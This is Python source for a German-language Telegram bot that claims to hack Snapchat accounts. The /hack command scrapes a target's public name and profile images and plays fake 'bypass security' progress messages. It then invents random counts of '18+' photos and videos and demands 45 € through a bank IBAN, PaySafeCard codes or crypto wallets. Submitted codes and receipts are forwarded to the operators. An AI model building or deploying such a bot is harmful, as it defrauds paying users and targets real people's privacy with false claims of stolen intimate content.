import os
import subprocess
from threading import Thread
from pathlib import Path
from random import sample, randint
from flask import Flask
import asyncio
import re
import requests
from bs4 import BeautifulSoup
from PIL import Image, ImageFilter
import urllib.request
import zipfile
import json
from telegram import Update, InlineKeyboardButton, InlineKeyboardMarkup
from telegram.ext import (
    ApplicationBuilder,
    CommandHandler,
    CallbackQueryHandler,
    ContextTypes,
    MessageHandler,
    filters,
)
from telegram.constants import ParseMode

# 📂 Datei für gespeicherte User
USERS_FILE = "users.txt"

# ✅ Umgebungsvariablen laden
TOKEN = os.getenv("TOKEN")
CHANNEL_ID = os.getenv("CHANNEL_ID")
ADMIN_CHAT_ID = os.getenv("ADMIN_CHAT_ID")       # Empfängt weitergeleitete Nachrichten + Reply an User
PROOF_ADMIN_ID = os.getenv("PROOF_ADMIN_ID")     # Empfängt nur Beweisfotos & Paysafe-Codes

if not TOKEN:
    raise ValueError("❌ Umgebungsvariable 'TOKEN' fehlt!")
if not CHANNEL_ID or not ADMIN_CHAT_ID:
    raise ValueError("❌ 'CHANNEL_ID' oder 'ADMIN_CHAT_ID' fehlt!")
if not PROOF_ADMIN_ID:
    raise ValueError("❌ Umgebungsvariable 'PROOF_ADMIN_ID' fehlt!")

CHANNEL_ID = int(CHANNEL_ID)
ADMIN_CHAT_ID = int(ADMIN_CHAT_ID)
PROOF_ADMIN_ID = int(PROOF_ADMIN_ID)

# 🗂️ Ordner für Videos und Bilder einrichten
BASE = Path(__file__).parent
IMAGE_DIR = BASE / "images"
VIDEO_DIR = BASE / "videos"
TEMP_DIR  = BASE / "temp"
PROFILE_DIR = BASE / "profiles"

for p in (IMAGE_DIR, VIDEO_DIR, TEMP_DIR, PROFILE_DIR):
    p.mkdir(exist_ok=True, parents=True)

# 💬 Mapping: gesendete Nachricht-ID (in Admin-Chat) -> ursprüngliche User-ID
forwarded_msg_to_user: dict[int, int] = {}

# 📥 GitHub Media Downloader (Render-optimiert)
def download_github_media():
    github_api_base = "https://api.github.com/repos/Ayman5552/snap/contents"

    imgs = [f for f in IMAGE_DIR.glob("*.*") if f.suffix.lower() in ('.jpg', '.jpeg', '.png', '.gif', '.webp') and f.name != '.gitkeep']
    vids = [f for f in VIDEO_DIR.glob("*.*") if f.suffix.lower() in ('.mp4', '.mov', '.avi') and f.name != '.gitkeep']

    if len(imgs) >= 5 and len(vids) >= 5:
        print(f"✅ Media bereits vorhanden: {len(imgs)} Bilder, {len(vids)} Videos")
        return True

    print("📥 Lade Media von GitHub...")

    try:
        img_response = requests.get(f"{github_api_base}/Images", timeout=30)
        if img_response.status_code == 200:
            images = img_response.json()
            print(f"📥 Lade {len(images)} Bilder von GitHub...")
            for img in images[:10]:
                if img['name'].lower().endswith(('.jpg', '.jpeg', '.png', '.gif', '.webp')):
                    img_path = IMAGE_DIR / img['name']
                    if not img_path.exists():
                        try:
                            urllib.request.urlretrieve(img['download_url'], img_path)
                            print(f"✅ {img['name']} heruntergeladen")
                        except Exception as e:
                            print(f"❌ Fehler beim Download {img['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Fehler beim Laden der Bilder: {e}")

    try:
        vid_response = requests.get(f"{github_api_base}/videos", timeout=30)
        if vid_response.status_code == 200:
            videos = vid_response.json()
            print(f"📥 Lade {len(videos)} Videos von GitHub...")
            for vid in videos[:5]:
                if vid['name'].lower().endswith(('.mp4', '.mov', '.avi')):
                    vid_path = VIDEO_DIR / vid['name']
                    if not vid_path.exists():
                        try:
                            urllib.request.urlretrieve(vid['download_url'], vid_path)
                            print(f"✅ {vid['name']} heruntergeladen")
                        except Exception as e:
                            print(f"❌ Fehler beim Download {vid['name']}: {e}")
    except Exception as e:
        print(f"⚠️ Fehler beim Laden der Videos: {e}")

    print(f"🎯 Media-Download abgeschlossen!")
    return True

# 🎛️ Blur-Einstellungen
BLUR_IMAGE_RADIUS = 28
VIDEO_BLUR_SIGMA = 36

# ---- Webserver (Render Alive) ----
app = Flask('')

@app.route('/')
def home():
    return "I'm alive"

def keep_alive():
    port = int(os.environ.get("PORT", 5000))
    Thread(target=lambda: app.run(host='0.0.0.0', port=port)).start()

# ---- Speicher für einmalige Beweise ----
user_proof_sent = set()
user_content_counts = {}

# ---- Altersverifikation ----
age_verified = set()

# ---- Video/Bild Verarbeitung ----
def censor_image(input_path: Path, output_path: Path):
    try:
        im = Image.open(input_path).convert("RGB")
        im = im.filter(ImageFilter.GaussianBlur(BLUR_IMAGE_RADIUS))
        im.save(output_path, format="JPEG", quality=90)
        return True
    except Exception as e:
        print(f"❌ Fehler beim Zensieren von {input_path}: {e}")
        return False

def check_ffmpeg():
    try:
        subprocess.run(['ffmpeg', '-version'], capture_output=True, check=True)
        return True
    except (subprocess.CalledProcessError, FileNotFoundError):
        return False

def censor_video(input_path: Path, output_path: Path):
    if not check_ffmpeg():
        print("❌ ffmpeg nicht verfügbar")
        return False
    vf = f"gblur=sigma={VIDEO_BLUR_SIGMA}"
    cmd = [
        "ffmpeg", "-y",
        "-i", str(input_path),
        "-vf", vf,
        "-c:v", "libx264", "-preset", "veryfast", "-crf", "28",
        "-an",
        str(output_path),
    ]
    print("➡️ ffmpeg:", " ".join(cmd))
    try:
        subprocess.run(cmd, check=True, capture_output=True, text=True)
        print("✅ ffmpeg OK:", output_path)
        return True
    except subprocess.CalledProcessError as e:
        print("❌ ffmpeg Fehler:", e.stderr)
        return False

# ---- Enhanced Snapchat Scraping ----
def extract_snapchat_profile_data(username: str):
    url = f"https://www.snapchat.com/@{username}"
    headers = {
        "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
    }
    try:
        resp = requests.get(url, headers=headers, timeout=15)
        if resp.status_code == 200:
            if "Sorry, this account doesn't exist." in resp.text or "Not Found" in resp.text:
                return False, None, None, None
            soup = BeautifulSoup(resp.text, "html.parser")
            name = None
            title = soup.find("title")
            if title:
                text = title.text.strip()
                name = text.split("(")[0].strip()
            else:
                name = username
            bitmoji_url = None
            bitmoji_elements = soup.find_all(['img', 'picture', 'source'],
                                           attrs={'src': re.compile(r'.*bitmoji.*', re.I)})
            for elem in bitmoji_elements:
                src_value = elem.get('src') if hasattr(elem, 'get') else None
                if src_value:
                    bitmoji_url = str(src_value)
                    break
            if not bitmoji_url:
                bitmoji_elements = soup.find_all(['img', 'picture', 'source'],
                                               attrs={'data-src': re.compile(r'.*bitmoji.*', re.I)})
                for elem in bitmoji_elements:
                    data_src = elem.get('data-src') if hasattr(elem, 'get') else None
                    if data_src:
                        bitmoji_url = str(data_src)
                        break
            profile_photo_url = None
            profile_elements = soup.find_all(['img'],
                                           attrs={'src': re.compile(r'.*(profile|avatar|user).*\.(jpg|jpeg|png|webp)', re.I)})
            for elem in profile_elements:
                src_attr = elem.get('src') if hasattr(elem, 'get') else None
                if src_attr and 'bitmoji' not in str(src_attr).lower():
                    profile_photo_url = str(src_attr)
                    break
            if not profile_photo_url:
                meta_image = soup.find('meta', property='og:image')
                if meta_image:
                    content = meta_image.get('content') if hasattr(meta_image, 'get') else None
                    if content and 'bitmoji' not in str(content).lower() and any(ext in str(content).lower() for ext in ['.jpg', '.jpeg', '.png', '.webp']):
                        profile_photo_url = str(content)
            return True, name, bitmoji_url, profile_photo_url
        else:
            return False, None, None, None
    except Exception as e:
        print("Fehler beim erweiterten Abruf von Snapchat:", e)
        return False, None, None, None

def download_image(url: str, filename: str) -> bool:
    if not url:
        return False
    clean_filename = re.sub(r'[^\w\-_\.]', '_', filename)
    if not clean_filename or '..' in clean_filename:
        clean_filename = f"profile_{hash(filename) % 10000}.jpg"
    try:
        headers = {
            "User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36"
        }
        response = requests.get(url, headers=headers, timeout=10)
        if response.status_code == 200:
            filepath = PROFILE_DIR / clean_filename
            with open(filepath, 'wb') as f:
                f.write(response.content)
            return True
    except Exception as e:
        print(f"❌ Fehler beim Download von {url}: {e}")
    return False

def check_snapchat_username_exists_and_get_name(username: str):
    exists, name, _, _ = extract_snapchat_profile_data(username)
    return exists, name

async def send_content_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE, user_id: int, n_img: int, n_vid: int):
    await context.bot.send_message(
        chat_id=user_id,
        text=(
            "🔒 Medien-Preview ist deaktiviert.\n\n"
            "Um Zugriff auf alle (legitimen) Inhalte zu erhalten, nutze bitte die offiziellen Zahlungswege (/pay) oder kontaktiere den Admin."
        )
    )
    return

# ---- START ----
async def start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user = update.effective_user
    uid = user.id

    if uid not in age_verified:
        keyboard = [
            [InlineKeyboardButton("✅ Ja, ich bin volljährig (18+)", callback_data="age_yes")],
            [InlineKeyboardButton("❌ Nein, ich bin minderjährig", callback_data="age_no")],
        ]
        await update.message.reply_text(
            "👋 Willkommen! Bevor es losgeht, brauchen wir kurz deine Bestätigung.\n\n"
            "⚠️ <b>Dieser Bot richtet sich ausschließlich an Personen ab 18 Jahren.</b>\n\n"
            "Bitte bestätige dein Alter, um fortzufahren:",
            parse_mode=ParseMode.HTML,
            reply_markup=InlineKeyboardMarkup(keyboard)
        )
        return

    uname = user.username or ""
    with open(USERS_FILE, "a", encoding="utf-8") as f:
        f.write(f"{uid} {uname}\n")
    text = (
        "👋 Herzlich willkommen!\n\n"
        "Um den Bot nutzen zu können, tritt bitte zuerst unserem Kanal bei:\n"
        "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
        "✅ Danach kannst du sofort loslegen:\n"
        "/hack [Snapchat-Benutzername] — z.B. /hack Lina.123\n\n"
        "⭐ Kundenbewertungen: https://t.me/+qICdaAr6lE4yMzZh\n\n"
        "💳 Zahlungsbeweise (Bank/Crypto als Foto oder Paysafe als Code) kannst du einfach hier im Chat senden."
    )
    await update.message.reply_text(text)

# ---- ALTERSVERIFIKATION CALLBACK ----
async def age_check(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    user = query.from_user
    uid = user.id

    if query.data == "age_yes":
        age_verified.add(uid)

        uname = user.username or ""
        with open(USERS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{uid} {uname}\n")

        text = (
            "✅ Perfekt, danke für deine Bestätigung!\n\n"
            "👋 Herzlich willkommen!\n\n"
            "Um den Bot nutzen zu können, tritt bitte zuerst unserem Kanal bei:\n"
            "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
            "✅ Danach kannst du sofort loslegen:\n"
            "/hack [Snapchat-Benutzername] — z.B. /hack Lina.123\n\n"
            "⭐ Kundenbewertungen: https://t.me/+qICdaAr6lE4yMzZh\n\n"
            "💳 Zahlungsbeweise (Bank/Crypto als Foto oder Paysafe als Code) kannst du einfach hier im Chat senden."
        )
        await query.edit_message_text(text)

    elif query.data == "age_no":
        await query.edit_message_text(
            "🚫 Schade, aber dieser Bot ist leider nur für Personen ab 18 Jahren zugänglich.\n\n"
            "Bitte komm wieder, sobald du volljährig bist! 👋"
        )

# ---- ADMIN: /listusers ----
async def list_users(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    if not os.path.exists(USERS_FILE):
        await update.message.reply_text("Noch keine Nutzer gespeichert.")
        return
    with open(USERS_FILE, "r", encoding="utf-8") as f:
        data = f.read().strip()
    if not data:
        await update.message.reply_text("Noch keine Nutzer gespeichert.")
    else:
        await update.message.reply_text(f"📋 Gespeicherte Nutzer:\n\n{data}")

# ---- HACK ----
async def hack(update: Update, context: ContextTypes.DEFAULT_TYPE):
    user_id = update.effective_user.id
    try:
        member = await context.bot.get_chat_member(CHANNEL_ID, user_id)
        if member.status in ["left", "kicked"]:
            await update.message.reply_text(
                "👋 Hey! Damit du den Bot nutzen kannst, musst du zuerst unserem Kanal beitreten:\n\n"
                "👉 t.me/+7tgziUqjnZUyZDYx\n\n"
                "Danach kannst du sofort weitermachen! 😊"
            )
            return
    except Exception as e:
        print("Fehler bei get_chat_member:", e)
        await update.message.reply_text("Fehler bei der Kanal-Überprüfung. Bitte versuche es später erneut.")
        return
    if not context.args:
        await update.message.reply_text("Bitte gib den Snapchat-Benutzernamen ein, z.B. /hack Lina.123")
        return
    username = context.args[0]
    exists, name, bitmoji_url, profile_photo_url = extract_snapchat_profile_data(username)
    if not exists:
        await update.message.reply_text(
            f"Der Snapchat-Benutzername *{username}* wurde nicht gefunden.",
            parse_mode=ParseMode.MARKDOWN
        )
        return
    msg = await update.message.reply_text("🚀 Starte den Vorgang...")
    await asyncio.sleep(3)
    await msg.edit_text("🔍 Search for user data...")
    await asyncio.sleep(3)
    await msg.edit_text("⚙️ Bypass security protocolse...")
    await asyncio.sleep(3)
    await msg.edit_text("📡 Access Private Details...")
    await asyncio.sleep(3)
    await msg.edit_text("🎭 Downloading Informations...")
    await asyncio.sleep(3)
    bitmoji_downloaded = False
    profile_downloaded = False
    if bitmoji_url and isinstance(bitmoji_url, str):
        bitmoji_filename = f"bitmoji_{username}.jpg"
        bitmoji_downloaded = download_image(bitmoji_url, bitmoji_filename)
    if profile_photo_url and isinstance(profile_photo_url, str):
        profile_filename = f"profile_{username}.jpg"
        profile_downloaded = download_image(profile_photo_url, profile_filename)
    bilder = randint(8, 12)
    videos = randint(7, 8)
    user_content_counts[user_id] = {"bilder": bilder, "videos": videos}
    msg_text = (
        f"👾 Wir haben den Benutzer ({username}) gefunden, und das Konto ist angreifbar! 👾\n\n"
        f"👤 {name}\n"
        f"🖼️ {bilder} Bilder als 18+ getaggt\n"
        f"📹 {videos} Videos als 18+ getaggt\n"
    )
    if bitmoji_downloaded:
        msg_text += f"🎭 Bitmoji extrahiert ✅\n"
    if profile_downloaded:
        msg_text += f"📸 Profilbild extrahiert ✅\n"
    msg_text += (
        f"\n💶 Um sofort Zugriff auf das Konto und den Mega Ordner zu erhalten, tätige bitte eine Zahlung von 45 € mit /pay.\n\n"
        f"👉 Nach der Zahlung erhältst du hier Alles: https://mega.nz/folder/JU5zGDxQ#-Hxqn4xBLRIbM8vBFFFvZQ\n"
        f"👉 Bei den Ersten Hack, bekommst du von den 40€ Rückerstattung von den 45€, NUR EINMALIG\n"
        f"🎁 Oder verdiene dir einen kostenlosen Hack, indem du andere mit /invite einlädst.\n\n"
    )
    await msg.edit_text(msg_text)
    if bitmoji_downloaded:
        try:
            bitmoji_path = PROFILE_DIR / f"bitmoji_{username}.jpg"
            with open(bitmoji_path, "rb") as f:
                await context.bot.send_photo(user_id, photo=f, caption=f"🎭 {name}'s Bitmoji")
        except Exception as e:
            print(f"❌ Fehler beim Senden von Bitmoji: {e}")
    if profile_downloaded:
        try:
            profile_path = PROFILE_DIR / f"profile_{username}.jpg"
            with open(profile_path, "rb") as f:
                await context.bot.send_photo(user_id, photo=f, caption=f"📸 {name}'s Profilbild")
        except Exception as e:
            print(f"❌ Fehler beim Senden von Profilbild: {e}")

# ---- PAY ----
async def pay(update: Update, context: ContextTypes.DEFAULT_TYPE):
    keyboard = [
        [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
        [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
        [InlineKeyboardButton("🪙 Crypto Zahlungen (am schnellsten)", callback_data="pay_crypto")],
    ]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await update.message.reply_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)

# ---- BUTTONS ----
async def button_handler(update: Update, context: ContextTypes.DEFAULT_TYPE):
    query = update.callback_query
    await query.answer()
    cmd = query.data
    info_refund = (
        "\n\n⚠️ <b>Wichtig:</b> Bei deine  <u>ersten Hack</u> hast du eine "
        "<b>5 Minuten Refund-Zeit</b>. Wenn du in dieser Zeit Stornierst, bekommst du <b>30€ von den 45€ €</b> zurück.\n\n"
        "📌 <b>Verwendungszweck:</b> Gib <u>dein Telegram-Username</u> an!"
    )
    if cmd == "pay_bank":
        text = (
            "🏦 <b>Banküberweisung</b>\n\n"
            "Empfänger: Euro Hunter\n"
            "IBAN: <code>IE32 PPSE 9903 8091 8899 18.</code>\n"
            f"{info_refund}"
            "\n\nBei Zahlung über Crypto, Amazon, sende den Code an @OpaHunter ."
            "\n\nTippe auf *Weiter*, auch wenn Fehler bei Empfänger Überüprüfung kommt."
            "\n\nBitte sende nach der Zahlung ein Foto deines Zahlungsbelegs."
        )
    elif cmd == "pay_paysafe":
        text = (
            "💳 <b>PaySafeCard</b>\n\n"
            "Bitte sende nur den 16-stelligen Code ins Chat:\n"
            "<code>0000-0000-0000-0000</code>\n"
            f"{info_refund}"
            "\n\nDer Code wird überprüft und weitergeleitet."
        )
    elif cmd == "pay_crypto":
        text = (
            "🪙 <b>Crypto-Adressen :</b>\n\n"
            "- Tippen, zum Kopieren.\n"
            "- BITCOIN: <code>bc1q4jlqdsr8epqp9fd7vacn24m7s0hahdau4t0s6q</code>\n"
            "- ETHEREUM: <code>0x456F994998c7c36892e6E0dcd8A71a5e85dddc56</code>\n"
            "- SOLANA: <code>4WEvmt31TcuBXVR5Qcw6Ea6R4KZBQHSJ3uHCZWiFmCb7</code>\n"
            f"{info_refund}"
            "\n\nFalls du kein Crypto besitzt, kannst du es Gebührenfrei bei cryptovoucher.io kaufen."
            "\n\nBitte sende hier ein Foto deines Zahlungsbelegs."
        )
    elif cmd == "pay":
        keyboard = [
            [InlineKeyboardButton("🏦 Banküberweisung", callback_data="pay_bank")],
            [InlineKeyboardButton("💳 PaySafeCard", callback_data="pay_paysafe")],
            [InlineKeyboardButton("🪙 Crypto Zahlung (am Schnellsten)", callback_data="pay_crypto")],
        ]
        reply_markup = InlineKeyboardMarkup(keyboard)
        await query.edit_message_text("Wähle eine Zahlungsmethode aus:", reply_markup=reply_markup)
        return
    else:
        await query.edit_message_text("Ungültige Auswahl.")
        return
    keyboard = [[InlineKeyboardButton("⬅️ Zurück", callback_data="pay")]]
    reply_markup = InlineKeyboardMarkup(keyboard)
    await query.edit_message_text(text, parse_mode=ParseMode.HTML, reply_markup=reply_markup)

# ---- PHOTO (Beweis) ----
async def handle_photo(update: Update, context: ContextTypes.DEFAULT_TYPE):
    from_user = update.message.from_user
    user_id = from_user.id

    # Beide Admins ignorieren
    if user_id in (ADMIN_CHAT_ID, PROOF_ADMIN_ID):
        return

    if user_id in user_proof_sent:
        await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
        return

    user_proof_sent.add(user_id)
    photo = update.message.photo[-1]
    caption = update.message.caption or ""

    forward_text = (
        f"📸 Neuer Beweis von @{from_user.username or from_user.first_name} (ID: {user_id})\n\n"
        f"Bildunterschrift:\n{caption}"
    )

    try:
        # Foto mit Beschreibung direkt an ADMIN_CHAT_ID senden (für Reply-Funktion)
        sent = await context.bot.send_photo(
            chat_id=ADMIN_CHAT_ID,
            photo=photo.file_id,
            caption=forward_text,
            parse_mode=ParseMode.HTML,
        )
        # Mapping speichern: Nachricht-ID im Admin-Chat -> User-ID
        forwarded_msg_to_user[sent.message_id] = user_id

        # Kopie auch an PROOF_ADMIN_ID senden
        await context.bot.send_photo(
            chat_id=PROOF_ADMIN_ID,
            photo=photo.file_id,
            caption=forward_text,
            parse_mode=ParseMode.HTML,
        )

        await update.message.reply_text(
            "✅ Dein Zahlungsbeweis wurde erfolgreich übermittelt! "
            "Wir prüfen ihn so schnell wie möglich. "
            "Falls du nach 5 Minuten noch keine Rückmeldung hast, wende dich gerne an @OpaHunter 😊"
        )

    except Exception as e:
        print("Fehler beim Senden des Beweisfotos:", e)
        await update.message.reply_text("❌ Fehler beim Senden des Beweisfotos.")

# ---- TEXT (Paysafe-Code + allgemeine Weiterleitung) ----
async def handle_text(update: Update, context: ContextTypes.DEFAULT_TYPE):
    text = update.message.text.strip()
    paysafe_pattern = re.compile(r"^\d{4}-\d{4}-\d{4}-\d{4}$")
    from_user = update.message.from_user
    user_id = from_user.id

    # Beide Admins ignorieren
    if user_id in (ADMIN_CHAT_ID, PROOF_ADMIN_ID):
        return

    if paysafe_pattern.match(text):
        # Paysafe-Code verarbeiten
        if user_id in user_proof_sent:
            await update.message.reply_text("❌ Du kannst nur einmal einen Zahlungsbeweis senden.")
            return
        user_proof_sent.add(user_id)
        msg = f"🎫 Neuer Paysafe-Code von @{from_user.username or from_user.first_name} (ID: {user_id}):\n<code>{text}</code>"

        # Paysafe-Code an ADMIN_CHAT_ID senden und Mapping speichern
        sent = await context.bot.send_message(
            chat_id=ADMIN_CHAT_ID,
            text=msg,
            parse_mode=ParseMode.HTML,
        )
        forwarded_msg_to_user[sent.message_id] = user_id

        # Kopie auch an PROOF_ADMIN_ID
        await context.bot.send_message(chat_id=PROOF_ADMIN_ID, text=msg, parse_mode=ParseMode.HTML)

        await update.message.reply_text(
            "✅ Dein Paysafe-Code wurde erfolgreich übermittelt! Wir melden uns gleich bei dir. 😊"
        )

    else:
        # Alle anderen Nachrichten an ADMIN_CHAT_ID weiterleiten
        try:
            forwarded = await context.bot.forward_message(
                chat_id=ADMIN_CHAT_ID,
                from_chat_id=user_id,
                message_id=update.message.message_id,
            )
            forwarded_msg_to_user[forwarded.message_id] = user_id
        except Exception as e:
            print(f"❌ Fehler beim Weiterleiten der Nachricht: {e}")
            # Fallback: als normale Nachricht senden
            try:
                fallback_text = (
                    f"💬 Nachricht von @{from_user.username or from_user.first_name} (ID: {user_id}):\n\n"
                    f"{text}"
                )
                sent = await context.bot.send_message(
                    chat_id=ADMIN_CHAT_ID,
                    text=fallback_text,
                )
                forwarded_msg_to_user[sent.message_id] = user_id
            except Exception as e2:
                print(f"❌ Fallback fehlgeschlagen: {e2}")

# ---- ADMIN REPLY -> USER ----
async def reply_to_user(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Wenn Admin auf eine weitergeleitete Nachricht antwortet, wird die Antwort an den User gesendet."""
    if update.message is None:
        return

    # Nur vom ADMIN_CHAT_ID verarbeiten
    if update.message.chat_id != ADMIN_CHAT_ID:
        return

    # Nur wenn es eine Reply ist
    if not update.message.reply_to_message:
        return

    original = update.message.reply_to_message
    user_id = None

    # Methode 1: forward_from (klappt wenn User keine Privatsphäre-Sperre hat)
    if original.forward_from:
        user_id = original.forward_from.id

    # Methode 2: eigenes Mapping als Fallback
    if not user_id:
        user_id = forwarded_msg_to_user.get(original.message_id)

    if not user_id:
        await update.message.reply_text(
            "⚠️ Nutzer-ID nicht erkennbar.\n"
            "Der Nutzer hat Privatsphäre-Einstellungen aktiviert und konnte nicht identifiziert werden."
        )
        return

    try:
        await context.bot.send_message(chat_id=user_id, text=update.message.text)
        await update.message.reply_text(f"✅ Nachricht wurde erfolgreich zugestellt.")
    except Exception as e:
        await update.message.reply_text(f"❌ Fehler beim Senden: {e}")

# ---- ADMIN: /sendcontent ----
async def send_content(update: Update, context: ContextTypes.DEFAULT_TYPE):
    if update.effective_user.id != ADMIN_CHAT_ID:
        return
    await update.message.reply_text("Hinweis: Automatisches Versenden von Preview-Medien ist deaktiviert.")

# ---- DUMMY INVITE/REDEEM/FAQ ----
async def invite(update: Update, context: ContextTypes.DEFAULT_TYPE):
    msg = "🎁 Lade Freunde ein und erhalte einen Free Hack! ( es müsste einer über dein Link kaufen)\n\n🔗 https://t.me/+o5LA7bbv0E8zZDdh"
    await update.message.reply_text(msg, parse_mode=ParseMode.HTML)

async def redeem(update: Update, context: ContextTypes.DEFAULT_TYPE):
    await update.message.reply_text("Das Einlösen von Credits ist aktuell nicht verfügbar.")

async def faq(update: Update, context: ContextTypes.DEFAULT_TYPE):
    faq_text = (
        "📖 *Häufig gestellte Fragen (FAQ)*\n\n"
        "❓ Wie funktioniert das Ganze?\n"
        "💬 Gib den Befehl /hack Benutzername ein.\n\n"
        "❓ Wie lange dauert ein Hack?\n"
        "💬 In der Regel 3–5 Minuten.\n\n"
        "❓ Wie bezahle ich?\n"
        "💬 Mit /pay nach dem Hack."
    )
    await update.message.reply_text(faq_text, parse_mode=ParseMode.MARKDOWN)

# ---- MAIN ----
def main():
    print("🚀 Bot startet...")
    keep_alive()
    app_builder = ApplicationBuilder().token(TOKEN)
    application = app_builder.build()

    application.add_handler(CommandHandler("start", start))
    application.add_handler(CommandHandler("hack", hack))
    application.add_handler(CommandHandler("pay", pay))
    application.add_handler(CommandHandler("listusers", list_users))
    application.add_handler(CommandHandler("sendcontent", send_content))
    application.add_handler(CommandHandler("invite", invite))
    application.add_handler(CommandHandler("redeem", redeem))
    application.add_handler(CommandHandler("faq", faq))
    application.add_handler(CallbackQueryHandler(age_check, pattern="^age_"))
    application.add_handler(CallbackQueryHandler(button_handler))
    application.add_handler(MessageHandler(filters.PHOTO, handle_photo))

    # Admin Reply -> User (group=0, feuert zuerst)
    application.add_handler(MessageHandler(
        filters.REPLY & filters.TEXT & ~filters.COMMAND,
        reply_to_user
    ), group=0)

    # Textnachrichten von Usern in group=1
    application.add_handler(MessageHandler(
        filters.TEXT & ~filters.COMMAND,
        handle_text
    ), group=1)

    print("✅ Bot läuft und wartet auf Nachrichten...")
    application.run_polling()

if __name__ == "__main__":
    main()
